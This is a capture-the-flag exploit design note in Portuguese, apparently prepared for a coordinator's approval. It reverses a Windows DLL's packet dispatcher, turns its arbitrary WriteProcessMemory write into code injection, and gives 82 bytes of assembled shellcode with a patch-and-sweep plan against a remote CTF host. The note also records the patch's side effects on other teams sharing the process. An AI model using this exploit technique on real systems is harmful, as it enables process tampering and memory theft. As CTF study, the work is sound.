# Second Chall Gecko — Vetor WriteProcessMemory (flag=2) — DESENHO, NÃO EXECUTADO

**Status:** aprovado pelo coordenador em **MODO DESENHO apenas** (2026-10-09). Este documento é
plano + shellcode já montado — **NÃO** existe aqui nenhum código que conecte ao alvo remoto.
Qualquer disparo contra `63.183.92.113:<PORT>` precisa de novo checkpoint explícito do usuário.

## FATOS (confirmados por disassembly estático local — nenhuma conexão nova ao alvo nesta sessão)

Fonte: `gecko2026.exe` (via radare2/objdump, imagebase `0x140000000`) + `module_dump_chall2.bin`
(dump raw da DLL já coletado em sessão anterior, carregado como binário puro na base real
`0x7ffae5040000`, disassemblado com `objdump -b binary -m i386:x86-64 --adjust-vma=...`).

- Dispatcher da DLL (VA `base+0x1800`): tabela `dispatch_table` em `base+0xe340` com 3 ponteiros
  de 8 bytes — `handler[0]=base+0x1620`, `handler[1]=base+0x1690`, `handler[2]=base+0x1730`. Lê
  `hdr.flag` (byte em `hdr+4`); se `>=3` retorna 0; senão chama `handler_table[flag](rcx=&hdr)`.
- `handler[1]` (flag=1, VA `base+0x1690`): `ReadProcessMemory(GetCurrentProcess(), base+hdr.counter,
  hdr+0xd, hdr.len, NULL)`, com cap `hdr.len<=0x1000`. Confirma o leak já documentado no chall1.
- `handler[2]` (flag=2, VA `base+0x1730`): **mesmo layout**, mas chama `WriteProcessMemory` no
  lugar de `ReadProcessMemory` (import diferente, offsets de argumento idênticos) → **WRITE
  arbitrário** em `base+hdr.counter`, bytes = `hdr.data` (corpo enviado por nós), tamanho
  `hdr.len<=0x1000`.
- `WriteProcessMemory` ignora a proteção de página normal — é o mecanismo que debuggers usam
  pra escrever em páginas `.text` RX (self-modifying via API, não via `mov` direto). A escrita
  alcança o próprio código executável da DLL, não só `.data`.
- `handler[0]` (flag=0, VA `base+0x1620..0x167c`, 92 bytes de código real) é um **guard one-shot**:
  `if (DAT_e36c == 1) { escreve DAT_e360-DAT_d018 em hdr.data[0..3]; DAT_e36c=0; return 1 } else
  return 0`. `DAT_e36c` só é 1 na primeira chamada de boot (feita pelo próprio EXE no startup).
  Depois disso, qualquer chamada legítima com `flag=0` cai no "else" (no-op). `base+0x167d..0x168f`
  (18 bytes) é padding `0xCC` puro. **Total do "slot morto" pós-boot: `0x1620..0x1690` = 112 bytes.**
- Offsets fixos relativos à base da DLL (só o valor de `base` muda por ASLR entre boots —
  recuperável via o self-ptr em `hdr+0xd068`, mesma técnica do chall1):
  - `0xa008` = IAT slot com o ponteiro real de `WriteProcessMemory` (kernel32)
  - `0xa010` = IAT slot com o ponteiro real de `GetCurrentProcess`
  - `0xa028` = IAT slot com o ponteiro real de `ReadProcessMemory`
  - `0xe340`/`0xe348`/`0xe350` = `dispatch_table[0/1/2]`
  - `0x1620..0x1690` = corpo+padding do handler flag=0 (slot morto pós-boot, 112 bytes úteis)

## HIPÓTESE (não confirmada — é o que o exploit testaria)

- **Onde está a flag2.** O enunciado diz "en la memoria del proceso"; o RPM (flag=1) só alcança
  `base_DLL + counter` (u32, forward-only, até ~4GB) — já mapeado `0x0..0x13000`, resto
  não-mapeado nos testes anteriores (`sweep2.py`). Shellcode rodando DENTRO do processo não tem
  essa limitação: pode calcular QUALQUER endereço 64-bit (via PEB) e usa `ReadProcessMemory` (não
  um `mov` direto) pra ler esse endereço de forma seguro — RPM falha "limpo" se não-mapeado, sem
  crashar o processo; um deref direto crasharia o processo inteiro se o endereço fosse inválido.
- **Candidato #1 (mais barato de testar):** a flag2 está na própria imagem do `gecko2026.exe`
  (host), nunca lida porque o RPM existente só lê a partir da base da DLL. O shellcode abaixo
  generaliza o primitivo de leitura pra usar `exe_base` (via PEB→Ldr→InLoadOrderModuleList[0] =
  sempre o módulo principal/EXE) em vez de `dll_base`, reaproveitando os campos `counter`/`len`
  do protocolo já existente — depois de plantado, qualquer pacote `flag=0,counter=X,len=Y`
  funciona como um "flag=1 mas a partir do EXE" (dá pra varrer exatamente como `sweep2.py` fazia
  pra DLL).
- **Candidato #2 (se #1 não achar nada):** heap/stack do processo. **Não coberto** por este
  shellcode mínimo (que só rebaseia a partir do EXE, não faz scan de heap) — precisaria de uma
  2ª geração de shellcode com `VirtualQuery`/heap-walk, fora do escopo deste desenho inicial.

## SHELLCODE (82 bytes, já montado em `wpm_shellcode.bin`; hex abaixo; fonte comentada)

```
4883ec384989cb418b530565488b042530000000488b4060488b4018488b4010488b40304801d0
4889c24d8d430d458b4b0948c7c1ffffffff48c744242000000000ff15c0890000b8010000004883c438c3
```

Assemblado e verificado com `pwntools.asm()` + `objdump` (ambiente local, sem rede). Fonte
(Intel syntax; `rcx` = ponteiro `hdr` = struct `<IBII>`+`data[]` na pilha do handler do EXE):

```asm
sub rsp, 0x38
mov r11, rcx              ; preserva hdr (r11 sobrevive; nao chamamos nada antes de reusa-lo)
mov edx, [r11+5]          ; edx = hdr.counter (zero-extend p/ rdx)
mov rax, [gs:0x30]        ; TEB
mov rax, [rax+0x60]       ; PEB
mov rax, [rax+0x18]       ; PEB_LDR_DATA*
mov rax, [rax+0x10]       ; InLoadOrderModuleList.Flink == 1o LDR_DATA_TABLE_ENTRY (= o EXE)
mov rax, [rax+0x30]       ; DllBase do EXE
add rax, rdx              ; rax = exe_base + counter   <- endereco alvo (controlado por nos)
mov rdx, rax              ; lpBaseAddress
lea r8, [r11+0xd]         ; lpBuffer = hdr.data (mesmo buffer que o EXE devolve via send)
mov r9d, [r11+9]          ; nSize = hdr.len (chamador deve manter <=0x1000)
mov rcx, -1               ; hProcess = (HANDLE)-1 pseudo-handle (sem chamar GetCurrentProcess)
mov qword ptr [rsp+0x20], 0   ; lpNumberOfBytesRead = NULL (permitido pela WinAPI)
call qword ptr [rip+0x89c0]   ; == call [base+0xa028] == *ReadProcessMemory
mov eax, 1                ; sempre reporta sucesso ao gate do EXE (mantem conexao viva mesmo
                           ;   se o RPM falhar -- permite varrer varios OFF sem reconectar)
add rsp, 0x38
ret
```

`call qword ptr [rip+0x89c0]` só resolve para `base+0xa028` **se** o shellcode for plantado
exatamente em `base+0x1620`. Se plantar em outro offset, recalcular:
`disp = 0xa028 - (destino + 0x48)`.

## PLANO DE EXECUÇÃO (pseudocódigo — quando/se aprovado)

Uma única conexão TCP (respeita rate-limit; não reconecta no meio):

1. `cookie` → exigir banner saudável `b"Welcome to this CTF\x00"` (retry/abortar se degradado).
2. **PATCH:** enviar `<IBII>(N=13+82, flag=2, counter=0x1620, len=82) + wpm_shellcode.bin`.
   Sobrescreve o slot morto do handler flag=0. Esperado: gate retorna 1 (eco de volta = sucesso).
3. **TRIGGER + SWEEP** (mesma conexão, gate fica aberto, pode encadear): enviar múltiplos
   `<IBII>(N=13, flag=0, counter=OFF, len=0x1000)` com `OFF = 0x0, 0x1000, 0x2000, ...` varrendo
   `exe_base` pra frente — igual à lógica de `sweep2.py`, só que agora com o handler trocado.
   Procurar `"HIK_"`/`"FLAG:"` em cada resposta.
4. Se nada aparecer dentro de alguns MB: **PARAR**, não escalar sozinho pra shellcode v2
   (heap-walk) sem novo checkpoint — esse é o limite deste desenho.

## RISCOS (ler antes de aprovar a execução)

- **Processo compartilhado com outras equipes.** Sobrescrever o handler flag=0 muda o
  comportamento de `flag=0` para QUALQUER conexão de QUALQUER equipe a partir do momento do
  patch (até o restart de ~10min). Se outra equipe estiver testando `flag=0` por
  tentativa-e-erro, recebe o resultado do NOSSO shellcode em vez do comportamento original — não
  deveria crashar (RPM falha "limpo"), mas MUDA o protocolo visível pra todo mundo. Efeito
  colateral real, não catastrófico.
- **Premissa "flag=0 é dead code pós-boot" não é 100% exaustiva.** Lemos o guard `DAT_e36c` só
  no handler flag=0 e no boot; não confirmamos ausência de QUALQUER outro ponto no binário que
  resete esse guard periodicamente (leitura pontual, não exaustiva de todo o binário). Risco
  classificado como BAIXO (nada no código lido sugere isso), não ZERO.
- **Sem reversibilidade pela rede.** Não há como "desfazer" o WPM remotamente — só o restart
  externo (~10 min, fora do nosso controle) restaura o binário original.
- **Custo:** 1 conexão cobre o plano inteiro (patch + sweep). Se o patch falhar (gate fecha), a
  conexão morre e é preciso esperar o cooldown (~65-75s) pra nova tentativa.
- **Layout PEB/LDR_DATA_TABLE_ENTRY assumido:** padrão Windows x64 desde Vista (TEB+0x30→PEB,
  PEB+0x18→Ldr, Ldr+0x10→InLoadOrderModuleList, entry+0x30→DllBase) — estável e bem documentado,
  risco baixo, mas não testado contra a DLL real num harness local (não disponível nesta sessão).

## Artefatos neste diretório

- `wpm_shellcode.bin` — os 82 bytes montados, prontos para anexar ao pacote de patch.
- Este arquivo (`WPM_PLAN.md`) — plano completo + riscos.
- **Nenhum script de disparo automático foi criado** (de propósito, por este ser um checkpoint
  de só-desenho) — o pseudocódigo da seção "Plano de execução" ainda precisa ser materializado em
  um script real antes de qualquer disparo, e isso deve esperar aprovação explícita.
